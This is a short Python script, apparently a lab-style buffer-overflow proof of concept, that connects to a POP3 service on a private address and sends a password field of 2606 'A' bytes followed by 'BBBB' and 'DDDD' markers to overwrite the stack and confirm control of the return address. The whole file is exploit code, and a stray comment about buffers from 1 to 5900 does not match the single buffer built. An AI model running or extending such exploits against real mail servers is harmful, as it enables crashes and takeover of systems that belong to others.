#!/usr/bin/python
import socket
# Create an array of buffers, from 1 to 5900, with increments of 200.
buffer="A"*2606+"BBBB" +"DDDD"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.0.134',110))
s.recv(1024)
s.send('USER test\r\n')
s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
s.send('QUIT\r\n')
s.close()